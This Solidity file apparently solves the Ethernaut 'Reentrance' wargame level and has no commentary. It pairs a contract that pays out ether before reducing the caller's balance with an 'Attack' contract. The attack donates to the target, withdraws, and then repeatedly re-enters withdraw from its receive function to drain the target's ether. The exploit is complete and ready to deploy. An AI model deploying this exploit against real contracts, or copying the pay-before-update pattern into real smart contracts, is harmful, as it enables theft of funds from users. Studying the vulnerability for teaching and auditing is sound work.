// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.1.0/contracts/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract Attack {
    Reentrance public addr;

    constructor(Reentrance _addr) public {
        addr = _addr;
    }

    receive() external payable {
        if (address(addr).balance >= 500000000000000 wei) {
            addr.withdraw(500000000000000);
        }
    }

    function attack() public payable {
        addr.donate{value: msg.value}(address(this));
        addr.withdraw(500000000000000);
    }
}
